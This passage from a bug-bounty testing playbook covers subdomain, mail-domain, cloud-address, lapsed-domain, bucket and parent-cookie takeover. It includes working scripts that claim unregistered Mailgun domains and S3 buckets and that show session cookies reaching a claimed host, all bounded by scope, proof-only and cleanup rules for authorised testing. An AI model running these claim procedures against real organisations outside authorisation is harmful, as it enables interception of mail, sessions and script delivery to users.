  same `sto-<hex>` label only, pointing at a server we run that serves STO-003's proof page.
- **Proof:** the parent's referral (`delegation.txt`), REFUSED or SERVFAIL from every delegated server before the
  claim (`lame.txt`), the zone in our account with a name server that matches the delegation, and the TXT answer
  for `sto-<hex>.<zone>` from two public resolvers, each with its time.
- **Not a finding when:** only some delegated servers refuse while others answer with authority: resolvers fall
  back to the good ones, and a partly lame delegation is a reliability issue at most. The provider refuses to
  create the zone because another account holds it ("already exists"). The delegation points at the
  organisation's own name servers and they are down: an outage, not a takeover. The attempt budget runs out on a
  pooled provider: report only where the policy accepts an unclaimed dead delegation, with the REFUSED evidence;
  most close it as informative (`takeover`). The parent publishes a DS record for the zone (`ds.txt` is not
  empty): validating resolvers reject the answers of a zone we create, so say that only non-validating resolvers
  are affected.
- **Escalate:** a held zone answers MX, TXT and CAA too: state in the report that mail and certificate issuance
  for every name under it are in reach, and prove nothing beyond the TXT record. STO-006 describes the mail side,
  STO-010 the cookie side when the zone is under the parent domain of a session cookie. Delete the zone as the
  policy says and record the time.

### STO-006 · Mail for an in-scope name is routed to a mail service where that domain is not registered, and adding it to our account delivers its mail to us

| | |
|---|---|
| **Severity** | High standalone when our test message to the domain reaches us and the organisation's mail uses the domain (reply, bounce, ticket or staff addresses); Medium for a domain nothing sends to |
| **Requires** | takeover-ok |
| **Excluded by** | takeover |
| **Unit** | programme |
| **Cost** | medium |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #819309, #174983, #2567048, #403822 |

- **Where:** runs once, over every in-scope name: any name can carry an MX record, and the fingerprint does not read
  MX, so no fact about one host can gate it. Names that usually do: the apex, `mail.`, `mg.`, `email.`,
  `reply.`, `bounce.`, `inbound.`, `parse.`, `support.`. Targets that matter: an MX host that returns NXDOMAIN,
  and the MX hosts of services where each customer adds its own domain: Mailgun (`mxa.mailgun.org`,
  `mxb.mailgun.org`, `mxa.eu.mailgun.org`), SendGrid Inbound Parse (`mx.sendgrid.net`), Postmark
  (`inbound.postmarkapp.com`), Amazon SES (`inbound-smtp.<region>.amazonaws.com`), Google Workspace and
  Microsoft 365. No paid report of this form is in the library; the disclosed ones are on Mailgun.
- **Test:** an NXDOMAIN MX host on a domain nobody holds is STO-004's check on that domain. For a mail service, add
  the domain to the operator's account there and see whether the service routes inbound mail for it before any DNS
  verification: services that want a TXT or DKIM record on the organisation's zone first (SES, Google Workspace,
  Microsoft 365) cannot be claimed this way. The receiving rule must match one random recipient only, so no other
  message to the domain is ever accepted on our side.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/@programme/STO-006"; mkdir -p "$D"
  jq -r 'to_entries[] | select(.value.in_scope) | .key' "$E/assets.json" | grep -vE '^[0-9.]+$|:' | sort -u > "$D/names.txt"
  # 1. every MX record of every in-scope name (DNS only: nothing is sent to the organisation's servers)
  while read -r n; do dig +short MX "$n" | awk -v n="$n" '{sub(/\.$/, "", $2); print $2, n}'; sleep 0.2; done < "$D/names.txt" | sort -u > "$D/mx.txt"
  # 2. MX hosts that do not resolve, and MX hosts on a mail service, with the names that use them
  cut -d' ' -f1 "$D/mx.txt" | sort -u | while read -r m; do
    printf '%s %s\n' "$(dig +noall +comments "$m" A | grep -oE 'status: [A-Z]+' | cut -d' ' -f2)" "$m"; done | tee "$D/mx-status.txt"
  grep -iE 'mailgun\.org|sendgrid\.net|postmarkapp\.com|amazonaws\.com|google\.com|outlook\.com|zoho\.' "$D/mx.txt" | tee "$D/mx-services.txt"
  ```
  Then, for one candidate domain `M` from `mx-services.txt`, in the operator's account at that service: add `M`
  as a domain without touching DNS, and create one receiving rule. On Mailgun that is a route with the expression
  `match_recipient("sto-<hex>@M")`, the action `forward("<username>+sto@wearehackerone.com")` and `stop()`, and
  no catch-all. A service whose inbound feature takes every message for the domain (SendGrid Inbound Parse posts
  all of them to a URL) cannot be tested without receiving other people's mail: stop at the acceptance screen.
  ```bash
  # 3. one message from us to the one address the rule matches, sent straight to the service's MX. Outbound port 25 is
  #    often blocked: then send the same message from the operator's own mailbox.
  M=$(awk '/mailgun\.org/{print $2; exit}' "$D/mx-services.txt"); MXH=$(awk -v m="$M" '$2==m{print $1; exit}' "$D/mx.txt")
  U=$(jq -r '.authorisation.h1_username' "$E/engagement.json"); R=$(openssl rand -hex 8); echo "rule recipient: sto-$R@$M"
  python3 - "$MXH" "sto-$R@$M" "$U+sto@wearehackerone.com" <<'PY'
  import smtplib, sys
  from email.message import EmailMessage
  mx, to, frm = sys.argv[1:4]
  m = EmailMessage(); m['From'] = frm; m['To'] = to; m['Subject'] = 'takeover proof ' + to
  m.set_content('Security research proof. No action needed.')
  with smtplib.SMTP(mx, 25, timeout=30) as s:
      print(s.send_message(m))
  PY
  printf 'mail domain %s added to our account at %s, rule sto-%s only, %s\n' "$M" "$MXH" "$R" "$(date -u +%FT%TZ)" >> "$E/cleanup.md"
  ```
- **Proof:** the name's MX records (`dig`), the service accepting `M` in our account with no DNS verification
  (screenshot or API response), our one test message arriving through the service with its full headers (the
  `Received:` chain through the service's MX), and the rule matching that single recipient. Then the domain
  removed from our account, with the time.
- **Not a finding when:** the service holds the message, or refuses the domain or the rule, until DNS verification
  passes: the organisation's zone holds the key, nothing is claimable. The MX points at the organisation's own
  verified tenant on a shared service (Google Workspace, Microsoft 365): mail reaches them, not an empty slot. The
  dead MX host has a higher preference number than a working one: senders use the working one, so the dead one
  would receive mail only when the working one fails; report it as such or not at all. SPF or DMARC records that
  name a lapsed domain are a sending problem, not this card (`spf-dmarc`). The only rule the service offers for an
  unverified domain is a catch-all: never enable it.
- **Escalate:** what the domain receives decides the severity: the applications' password-reset and invitation
  mail for accounts on that domain (where an application lets us register our own second account as
  `sto-<hex>@M`, show its reset link arriving: the AUT chapter), certificate authorities' e-mail validation to
  `admin@` or `postmaster@` (describe only; never request a certificate), and SaaS domain-ownership e-mails. A zone
  held through STO-005 gives MX for every name in it the same way.

### STO-007 · An in-scope name's A record points at a cloud address the organisation released, now silent or serving someone else

| | |
|---|---|
| **Severity** | Low standalone when the address is only silent; Medium when it now serves another party's site under the organisation's name |
| **Requires** | — |
| **Excluded by** | takeover |
| **Unit** | programme |
| **Cost** | medium |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #1112679, #125118, #1590115, #1296366 |

- **Where:** no asset fact marks an address as cloud-hosted, so the gate is empty and the card runs once per
  programme, over every in-scope name with A records and no CNAME (a CNAME is STO-001's or STO-002's case).
  Addresses in AWS, Google Cloud, Azure, DigitalOcean, Linode, Oracle, OVH, Hetzner or Vultr ranges go back to a
  pool when released and are handed to other customers; the organisation's own ranges and its CDN are not.
- **Test:** for each name on a cloud range, compare what the address serves now with what the name served before.
  A certificate or a site for another organisation means the record outlived the machine. Silence proves nothing:
  a firewalled server and an unassigned address look the same. Do not try to obtain the address: providers do not
  let a customer choose one (outside bring-your-own-IP), so a claim means allocating and releasing addresses until
  the right one returns; it is slow, it costs money, and each address in the pool was someone's a moment ago.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/@programme/STO-007"; mkdir -p "$D"
  jq -r 'to_entries[] | select(.value.in_scope) | .key' "$E/assets.json" | grep -vE '^[0-9.]+$|:' | sort -u > "$D/names.txt"
  # 1. names with their own A records, and the network owner of each address (whois: nothing is sent to the address)
  while read -r n; do
    [ -n "$(dig +short CNAME "$n")" ] && continue
    for ip in $(dig +short A "$n" | grep -E '^[0-9.]+$'); do
      printf '%s %s %s\n' "$n" "$ip" "$(whois "$ip" 2>/dev/null | grep -m1 -iE '^(orgname|org-name|netname|owner|descr):' | cut -d: -f2- | xargs)"
    done; sleep 1
  done < "$D/names.txt" | tee "$D/a-owners.txt"
  grep -iE 'amazon|google|microsoft|digitalocean|linode|akamai|oracle|ovh|hetzner|vultr' "$D/a-owners.txt" > "$D/cloud.txt"
  # 2. what each cloud address serves now for the name: its certificate and its page
  while read -r n ip _; do
    cert=$(echo | timeout 10 openssl s_client -connect "$ip:443" -servername "$n" 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null | tr '\n' ' ')
    page=$(curl -sS "${HDR[@]}" -k --max-time 10 -o "$D/$n.html" -w '%{http_code} %{size_download}' "https://$n/" 2>/dev/null)
    echo "$n $ip | ${page:-no answer} | ${cert:-no certificate}"; sleep 1
  done < "$D/cloud.txt" | tee "$D/now.txt"
  # 3. what each name served before: certificate history and the last archived captures
  while read -r n _; do
    curl -sS "${HDR[@]}" "https://crt.sh/?q=$n&output=json" | jq -r --arg n "$n" '.[] | [$n, .not_before[0:10], .issuer_name, (.name_value | gsub("\n"; ","))] | @tsv' | sort -k2 | tail -3
    curl -sS "${HDR[@]}" "https://web.archive.org/cdx/search/cdx?url=$n/&fl=timestamp,statuscode,digest&limit=-3"; sleep 2
  done < "$D/cloud.txt" | tee "$D/before.txt"
  ```
- **Proof:** the A record (`dig`), the address's owner (whois), the certificate and page the address now serves for
  the name, naming another organisation, with a screenshot, and the history showing the organisation served the
  name before (a certificate issued for it under the organisation, an archived capture of its site). One GET of
  `/` and one TLS handshake are the only requests to the third party's machine.
- **Not a finding when:** the address only times out or refuses: unassigned and firewalled look the same; park it
  and do not report a guess. The other party is a vendor the organisation uses on purpose (the certificate names
  its e-commerce platform, WAF or load-balancer provider). The address belongs to the organisation's own range.
  The programme requires a working claim (`takeover`): this card never produces one, however solid the evidence.
- **Escalate:** a third party serving content under the name also receives any parent-domain session cookie
  (STO-010): say so from the cookie's `Domain` attribute alone, and never test it against that party's machine.
  Report quickly: the third party can change what it serves at any time.

### STO-008 · A page of the asset loads script, style or a frame from a domain that is no longer registered

| | |
|---|---|
| **Severity** | High standalone for a script, module or worker loaded on a page of an origin with sessions; Medium for a stylesheet, a frame, or script on an origin without sessions; Low for images, fonts and links; None for a CSP or CORS allow-list entry alone (a primitive for XSS-015 or COR items) |
| **Requires** | http, !redirect-only, !default-page |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Inclusion of Functionality from Untrusted Control Sphere · CWE-829 |
| **Prior art** | #1590794, #791674, #279351 |

- **Where:** every page template of the deployment (home, login, sign-up, checkout, help, the logged-in shell) and
  the bundles the fingerprint saved: `<script src>`, `<link rel=stylesheet|preload|modulepreload>`, `<iframe
  src>`, `<object data>`, `<form action>`, `import()` and `importScripts()` URLs, worker scripts, source-map URLs,
  the hosts in `Content-Security-Policy`, and the hosts the JavaScript fetches from. Old pages and marketing
  templates hold most of them (retired analytics, A/B-testing, chat and font vendors).
- **Test:** list every external host the pages load from, keep the ones that do not resolve, and check whether the
  registrable domain behind each can be bought (the SOA and RDAP steps of STO-004). A dead host on a domain that
  still exists belongs to its owner: a vendor's dangling record is the vendor's bug (`third-party`). Only an
  unregistered domain, or an unclaimed bucket (STO-009), is ours to prove.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-008"; mkdir -p "$D"
  for p in / /login /signup /pricing /help "/sto$RANDOM"; do curl -sS "${HDR[@]}" -L --max-time 20 "$T$p"; echo; sleep 1; done > "$D/pages.html"
  curl -sS "${HDR[@]}" -D- -o /dev/null "$T/" | grep -i '^content-security-policy' > "$D/csp.txt"
  # 1. every host the pages, the saved bundles and the CSP name
  cat "$D/pages.html" "$E/recon/$H/js/"* 2>/dev/null | grep -oiE '(https?:)?//[a-z0-9][a-z0-9.-]*\.[a-z]{2,}' \
    | sed -E 's#^(https?:)?//##' | tr 'A-Z' 'a-z' > "$D/hosts.txt"
  tr ' ;' '\n\n' < "$D/csp.txt" | grep -oiE '^(https?://)?(\*\.)?[a-z0-9][a-z0-9.-]*\.[a-z]{2,}' | sed -E 's#^https?://##; s#^\*\.##' >> "$D/hosts.txt"
  # 2. the hosts that do not resolve, with the zone that answered for each
  sort -u "$D/hosts.txt" | while read -r x; do
    s=$(dig +noall +comments "$x" A | grep -oE 'status: [A-Z]+' | cut -d' ' -f2)
    [ "$s" = NOERROR ] || echo "$s $x $(dig +noall +authority SOA "$x" | awk '$4=="SOA"{print $1; exit}')"; sleep 0.2
  done | tee "$D/dead.txt"
  # 3. per dead host: the registrable domain and its RDAP answer, the zone's RDAP answer, and the tags that use the host
  while read -r s x z; do
    dom=$(echo "$x" | awk -F. -v z="${z%.}" '{n=split(z, a, "."); print $(NF-n) "." z}')
    dc=$(curl -sS "${HDR[@]}" -L -o /dev/null -w '%{http_code}' "https://rdap.org/domain/$dom")
    zc=$(curl -sS "${HDR[@]}" -L -o /dev/null -w '%{http_code}' "https://rdap.org/domain/${z%.}")
    echo "$x: domain $dom rdap $dc, zone ${z%.} rdap $zc"; grep -oiE "<(script|link|iframe|object|form|img|a)[^>]*${x//./\\.}[^>]*>" "$D/pages.html" | head -3; sleep 1
  done < "$D/dead.txt" | tee "$D/verdict.txt"                # domain 404 and zone not 200: the domain can be bought
  ```
  ```bash
  # 4. with the scriptable browser: the requests the pages really make, and the ones that fail on DNS
  cat > "$D/net.js" <<'JS'
  // usage: net.js <base URL> <comma-separated paths> <the HDR arguments>
  const { chromium } = require('playwright');
  (async () => {
    const [base, paths, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), p = await (await b.newContext({ userAgent: ua, extraHTTPHeaders: hd })).newPage();
    p.on('requestfailed', r => console.log('FAIL', r.failure().errorText, r.resourceType(), r.url()));
    for (const x of paths.split(',')) await p.goto(base + x, { waitUntil: 'networkidle' }).catch(() => {});
    await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/net.js" "$T" /,/login,/signup "${HDR[@]}" | grep ERR_NAME_NOT_RESOLVED | tee "$D/dns-failures.txt"
  ```
  A purchase is optional and follows STO-004's rule (`takeover-ok`, the operator's approval of the cost): serve
  STO-003's proof page at an unguessable path and leave every referenced path unanswered, so no visitor's browser
  runs anything we serve. To show what a script there would do, run the page in our own browser with the
  referenced URL answered locally (`page.route(url, r => r.fulfill({ contentType: 'text/javascript', body:
  'alert(document.domain)' }))`), never from the bought domain.
- **Proof:** the page response, saved raw, with the tag that loads from the dead host and the page's URL; the
  reference type (a script on the login page, a frame, an image); RDAP 404 for the registrable domain with a
  non-200 answer for the zone above it; with a purchase, our proof page served from that domain. A local-route
  demonstration may accompany it, labelled as one.
- **Not a finding when:** the reference is a plain link, an image or a font: Low at best, and most programmes
  close it as informative. The tag sits in a comment, a `<noscript>` block or code that never runs: show that it
  executes, or it is Low. The script carries Subresource Integrity (`integrity=`): the browser refuses a file we
  serve, so only a broken page remains. The host does not resolve but its domain is registered: the vendor removed
  one record (`third-party`). The page is not reachable by users (a staging template). A CSP entry alone, without
  an injection point, is a primitive: park it for XSS-015.
- **Escalate:** a script include in the application origin is stored XSS for every visitor: XSS-018 for what
  script there reaches, shown in our own browser and our own accounts only. A CSP `script-src` or `form-action`
  naming the domain turns any HTML injection into script or credential capture (XSS-015; #1590794 used a lapsed
  `form-action` domain). An OAuth `redirect_uri` or a CORS allow-list naming it: OAU-001, COR items. Where the
  policy does not need a purchase, report before buying: anyone who reads the same page can register a cheap
  domain.

### STO-009 · A bucket the asset's pages, scripts or downloads reference does not exist, and creating it in our account would serve its files

| | |
|---|---|
| **Severity** | High when the application or its users load code from the bucket (a script on the application origin, an installer, an update, a build input); Medium for images or documents shown in the application; Low when nothing reads it any more |
| **Requires** | cloud-storage |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Externally Controlled Reference to a Resource in Another Sphere · CWE-610 |
| **Prior art** | #1598347, #152584, #399166, #2262939 |

- **Where:** bucket host names and paths in the deployment's pages, bundles, source maps, download links, install
  scripts and documentation: S3 (`<bucket>.s3.amazonaws.com`, `<bucket>.s3.<region>.amazonaws.com`,
  `s3.amazonaws.com/<bucket>`), Google Cloud Storage (`storage.googleapis.com/<bucket>`,
  `<bucket>.storage.googleapis.com`), Azure (`<account>.blob.core.windows.net`), DigitalOcean Spaces
  (`<bucket>.<region>.digitaloceanspaces.com`). A CDN distribution whose origin is a deleted bucket serves the
  same way (#2262939). A bucket reached through a CNAME of an in-scope name is STO-001.
- **Test:** ask each storage service whether the bucket exists. S3, Google Cloud Storage and Spaces answer
  `NoSuchBucket` for a name nobody holds; Azure answers NXDOMAIN for a storage account nobody holds. Bucket names
  are global per provider, so a free name can be created by anyone.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-009"; mkdir -p "$D"
  # 1. bucket references in what the fingerprint and the crawl saved
  grep -rhoiE '[a-z0-9.-]+\.s3[.-]([a-z0-9-]+\.)?amazonaws\.com|s3[.-]([a-z0-9-]+\.)?amazonaws\.com/[a-z0-9._-]+|storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9._-]+\.storage\.googleapis\.com|[a-z0-9-]+\.blob\.core\.windows\.net|[a-z0-9.-]+\.digitaloceanspaces\.com' \
    "$E/recon/$H/" 2>/dev/null | tr 'A-Z' 'a-z' | sort -u | tee "$D/refs.txt"
  # 2. does each bucket exist? One GET to the storage service per name, none to the target
  while read -r r; do
    case "$r" in
      *.blob.core.windows.net) echo "$(dig +noall +comments "$r" A | grep -oE 'status: [A-Z]+') $r" ;;
      *) echo "$(curl -sS "${HDR[@]}" -k --max-time 15 "https://$r/" | grep -oE '<Code>[A-Za-z]+</Code>' | head -1) $r" ;;
    esac; sleep 1
  done < "$D/refs.txt" | tee "$D/exists.txt"              # NoSuchBucket or NXDOMAIN: free; AccessDenied or a listing: it exists
  # 3. where the application uses each free bucket, and for what
  awk '/NoSuchBucket|NXDOMAIN/{print $NF}' "$D/exists.txt" | while read -r r; do grep -rniF "$r" "$E/recon/$H/" | cut -c1-300 | head -5; done
  ```
  ```bash
  # 4. claim (takeover-ok): the bucket, private except for one object, the proof. Nothing at the keys the application
  #    requests, so none of its users receives anything from us. S3 shown; the region is in the reference, else us-east-1
  r=$(awk '/NoSuchBucket/{print $NF; exit}' "$D/exists.txt"); BK=$(echo "$r" | sed -E 's#^s3[.-]([a-z0-9-]+\.)?amazonaws\.com/##; s#\.s3[.-].*$##')
  REG=$(echo "$r" | grep -oE '[a-z]{2}-[a-z]+-[0-9]' || echo us-east-1)
  U=$(jq -r '.authorisation.h1_username' "$E/engagement.json"); R=$(openssl rand -hex 16)
  printf '<!doctype html><meta name="robots" content="noindex,nofollow"><!-- bucket takeover proof by HackerOne user %s --><p>%s %s</p>\n' "$U" "$BK" "$R" > "$D/$R.html"
  aws s3api create-bucket --bucket "$BK" --region "$REG" $([ "$REG" = us-east-1 ] || echo "--create-bucket-configuration LocationConstraint=$REG")
  aws s3api put-public-access-block --bucket "$BK" --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=false,RestrictPublicBuckets=false
  aws s3api put-bucket-policy --bucket "$BK" --policy "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$BK/$R.html\"}]}"
  aws s3 cp "$D/$R.html" "s3://$BK/$R.html" --content-type text/html
  # through the same URL form the application uses (outside us-east-1 the global name can take a while to follow)
  curl -sS "${HDR[@]}" -k -L -D- "https://$r/$R.html" | tee "$D/proof.txt" | grep -c "$R"
  printf 's3://%s claimed %s\n' "$BK" "$(date -u +%FT%TZ)" >> "$E/cleanup.md"
  ```
- **Proof:** the line in the page, bundle or script that references the bucket (file and position), `NoSuchBucket`
  (or NXDOMAIN for an Azure account) before the claim, then our proof object served from the bucket through the
  URL form the application uses, while the keys the application requests answer `AccessDenied`: nothing of ours
  reaches its users.
- **Not a finding when:** the bucket exists and answers `AccessDenied`: private and still owned (if it is also
  listable or writable, that is the cloud chapter). The reference is in dead code, a comment or an old changelog
  and nothing fetches it: Low, and most programmes close it as informative. The reference comes from a third
  party's script that the page includes (`third-party`: tell the operator). The Azure account exists but the
  container does not (`ContainerNotFound`): only the account's owner can create containers. The name is in a
  partition we cannot create in (AWS GovCloud or China).
- **Escalate:** a script on the application origin loaded from the bucket is stored XSS for every visitor
  (#1598347): show it with XSS-018 in our own browser, answering the referenced URL locally instead of placing a
  script in the bucket. An installer, update or build input fetched from it is code execution on users' or the
  organisation's machines (#399166, #329689): describe it, never upload anything. A CSP that allows the bucket
  host is XSS-015. Delete the bucket when the programme confirms.

### STO-010 · The session cookie of an application is scoped to the parent domain of a claimed host, so the browser sends it there

| | |
|---|---|
| **Severity** | None standalone (a parent-domain cookie is a common design); High with a host claimed in STO-003, STO-004 or STO-005: every logged-in visitor's session reaches a server the attacker runs; Critical when that cookie is the single sign-on session of the organisation's applications |
| **Requires** | dangling, cookie-auth, account, browser, takeover-ok |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #219205, #335330, #172137 |

- **Where:** runs once per programme when any host is `dangling`: the claimed host recorded by STO-003, STO-004
  or STO-005 (`$E/evidence/<host>/STO-00N/claimed.txt`: host, proof path, time) against every application on the
  same parent domain where we hold an account. The single sign-on host and the main application first: their
  cookies are the ones scoped widest.
- **Test:** a cookie set with `Domain=example.com` (stored as `.example.com`) is sent by the browser to every host
  under `example.com`, the claimed one included, whatever its `SameSite` value (the claimed host is same-site) and
  even when `HttpOnly` hides it from script. A cookie without a `Domain` attribute, or with the `__Host-` prefix,
  stays on the host that set it. A `Secure` cookie travels only over HTTPS with a certificate the browser accepts
  for the claimed name. Show it with our account B in our own browser: the browser's request log carries the
  evidence, and nothing is captured on the claimed host.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/@programme/STO-010"; mkdir -p "$D"
  read -r CH CP _ < <(cat "$E"/evidence/*/STO-00[345]/claimed.txt 2>/dev/null | head -1); echo "claimed host $CH, proof $CP"
  # 1. B's cookies with their Domain, from a storage state saved after logging B in once in the browser:
  #    npx --yes playwright open --save-storage="$E/accounts/B.state.json" "<the application's login page>"
  jq -r '.cookies[] | [.domain, .name, (.httpOnly | tostring), (.secure | tostring), .sameSite] | @tsv' "$E/accounts/B.state.json" | tee "$D/cookies.tsv"
  awk -F'\t' -v h=".$CH" '$1 ~ /^\./ && substr(h, length(h) - length($1) + 1) == $1' "$D/cookies.tsv" | tee "$D/reach-claimed.tsv"
  # 2. the browser, holding B's state, opens the proof page; print the Cookie header it sent, values cut to 4+4 characters
  cat > "$D/send.js" <<'JS'
  // usage: send.js <proof URL on the claimed host> <storage state file> <output file>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, state, out] = process.argv.slice(2), b = await chromium.launch(), c = await b.newContext({ storageState: state }), p = await c.newPage();
    p.on('request', async r => { if (r.url() === url) fs.writeFileSync(out, ((await r.allHeaders()).cookie || '(no cookie header)').replace(/=([^;]{4})[^;]*([^;]{4})/g, '=$1...$2') + '\n'); });
    await p.goto(url).catch(e => console.log(String(e))); await p.waitForTimeout(1500); await p.screenshot({ path: out + '.png' }); await b.close();
  })();
  JS
  for s in https http; do NODE_PATH="$(npm root -g)" node "$D/send.js" "$s://$CH$CP" "$E/accounts/B.state.json" "$D/sent-$s.txt"; done
  cat "$D"/sent-*.txt
  # 3. which of those names is B's session: the cookie in the headers $B sends
  grep -i '^cookie:' "$E/accounts/B.headers" | sed 's/^[Cc]ookie: *//' | tr ';' '\n' | cut -d= -f1 | sed 's/^ *//' | sort -u
  ```
- **Proof:** the claim (from STO-003, STO-004 or STO-005); B's session cookie stored with `Domain=.<parent>` (the
  storage-state line); the browser's request to `https://<claimed host>/<hex>.html` carrying that cookie, value
  cut to its first and last four characters, with the screenshot; and the cookie's role: it is the session cookie
  in B's request headers. No server-side log of anyone's request is collected or shown.
- **Not a finding when:** the cookie is host-only (no leading dot) or `__Host-` prefixed: it never leaves the host
  that set it. The cookie that reaches the claimed host is not a session (analytics, consent, an A/B bucket, a CSRF
  token without its session). The session cookie is `Secure` and the claim is served over plain HTTP or with a
  certificate the browser rejects (an S3 website endpoint, an S3 REST endpoint under its own certificate): real
  browsers do not send it there; record the cookies that do go. The parent domain differs (`.app.example.com`
  cookies do not reach `old.example.com`). The session is bound to an IP address, a device or a token, so a copied
  cookie fails: show that, or rate lower (Uber added IP binding to its SSO cookies after #219205).
- **Escalate:** the same trust through other doors, each shown from the main application's responses with our own
  accounts only: a CORS policy that answers `Origin: https://<claimed host>` with
  `Access-Control-Allow-Credentials: true` (COR items), an OAuth `redirect_uri` accepted on the claimed host
  (OAU-001), a CSP that allows its scripts (XSS-015). The claimed host could also set parent-domain cookies:
  session fixation (AUT-016) or a cookie written into pages (XSS-016). Describe them; serving a `Set-Cookie` or a
  script to real visitors is out of bounds.

## Graveyard

- **A fingerprint, no claim.** An unclaimed page or an NXDOMAIN target reported without a claim is closed as
  informative or N/A wherever the policy wants a working claim (`takeover`), and everywhere once the service
  cannot be claimed any more: CloudFront's "Bad request" (a distribution needs a certificate for the name), Azure's
  "404 Web Site not found" on a target that still resolves (the app exists), labels the provider generates
  (`d<id>.cloudfront.net`, `*.herokudns.com`).
- **Scanner output.** A subzy, subjack or nuclei takeover line pasted as the report (`automated`). The templates
  match strings; they do not know whether a name can be claimed.
- **A silent cloud address.** An A record into EC2 or Azure that times out proves nothing, and nobody can ask for a
  specific address back (`takeover`). Only another party's certificate or site on the address carries a report
  (STO-007).
- **Broken links to social-media handles.** A footer link to a deleted Twitter/X, Instagram, LinkedIn or Facebook
  account that anyone can register: 27 broken-link reports in the index, one paid ($100, #1466889). No exclusion
  tag fits exactly; impersonation that needs users to trust a profile is closest to `social-engineering`. The
  exception is a GitHub account or repository, or a package name, that install or build instructions tell users
  to fetch (#1031321 was rated high): that is code on users' machines, proven by registering the empty name and
  publishing nothing.
- **A vendor's dangling record.** A dead CNAME on a vendor's domain that the target links to or loads from is the
  vendor's to fix (`third-party`); do not claim it; the operator may tell the vendor.
- **"Available" domains that are not.** NXDOMAIN at the registry for a domain in `pending delete`, `redemption
  period`, `client hold` or `server hold`; a domain a reseller holds behind a for-sale page; a registrar's search
  page as the only evidence. All N/A.
- **Lapsed domains in plain links.** A link in documentation, a blog post, an old e-mail template or a footer to a
  domain that lapsed: Low or informative, since nothing runs in the application's origin.
- **SPF `include:` of a lapsed domain.** Registering it lets anyone send mail that passes SPF for the
  organisation; most programmes close mail-authentication findings under `spf-dmarc`.
- **Throwaway infrastructure.** Some programmes rate claims on test or per-developer cloud names low or not at
  all: the 16 Mozilla takeover reports on `mozaws.net` and `mozgcp.net` names show no bounty in the index.
- **Out-of-scope names.** A claimable name outside the scope table, or on a sibling brand's domain, is N/A however
  real.
- **Duplicates.** Continuous monitors watch this class. A name that has dangled for weeks on a public wildcard
  programme is probably reported: mark it `dup-risk` and claim only if the policy pays duplicates of unfixed
  issues, which few do.

## Chains

- STO-003, STO-004, STO-005 → STO-010: a session cookie scoped to the parent domain reaches the claimed host
  (#219205, rated critical).
- STO-003, STO-004, STO-005 → OAU-001: an authorization server that accepts any subdomain of the client's domain
  as `redirect_uri` delivers codes and tokens to the claimed host.
- STO-003, STO-004, STO-005 → COR items: a CORS policy that trusts `*.<parent domain>` with credentials lets the
  claimed origin read the API as the victim.
- STO-003, STO-004, STO-005, STO-008, STO-009 → XSS-015: a CSP that allows scripts from the claimed host, bucket
  or domain runs our script despite the policy.
- STO-003, STO-004, STO-005 → AUT-016 and XSS-016: the claimed host can set cookies for the parent domain: a fixed
  session, or a cookie value the application writes into its pages.
- STO-008, STO-009 → XSS-018: script loaded into the application origin is stored XSS for every visitor; XSS-018
  carries it to account takeover, in our own accounts.
- STO-005 → STO-006: a held zone answers MX too, and TXT records that SaaS providers accept as proof of domain
  ownership; describe them, do not use them.
- STO-006 → the AUT chapter: password-reset and invitation mail for accounts on the claimed mail domain, shown
  with our own account registered at that domain.
- When the target is itself a hosting or SaaS platform, its custom-domain verification is this class seen from the
  other side (#1086108, $3,100: a trailing dot defeated the check on Shopify's wholesale domains): test it as
  access control (BAC chapter).

## Sources

- `kb/reports/takeover.md` and `kb/reports/all/takeover.md`: the disclosed reports this chapter is built from.
  The counts by title and by service were computed from `kb/data/index.jsonl`.
- `docs/04-evidence-standard.md` (proof and clean-up rules for a takeover), `docs/02-reportability.md` (claim only
  where `takeover-ok`), `docs/07-graveyard.md`, `playbooks/PB-11-report.md` (report the same hour).
- EdOverflow, can-i-take-over-xyz (github.com/EdOverflow/can-i-take-over-xyz): per-service status (`Vulnerable`,
  `Edge case`, `Not vulnerable`), fingerprints and the discussion of each claim. It is the reference for which
  services can still be claimed; statuses change, so read the row on the day.
- OWASP WSTG-CONF-10, Test for Subdomain Takeover.
- Patrik Hudak, the subdomain takeover write-ups at 0xpatrik.com (the Starbucks Azure reports #325336 and #388622
  link to them).
- Microsoft Learn, "Prevent dangling DNS entries and avoid subdomain takeover"; AWS documentation for Elastic
  Beanstalk `check-dns-availability` and for Route 53 hosted zones and their delegation sets.
- RFC 6265 §4.1.2.3 and §5.1.3 (the cookie `Domain` attribute and domain matching); RFC 9082 and RFC 9083 (RDAP
  queries and responses).
- HexBrain: `get_testing_playbook {"topic":"Subdomain Takeover"}`,
  `search_reports {"topic":"subdomain takeover","status":"informative"}`.
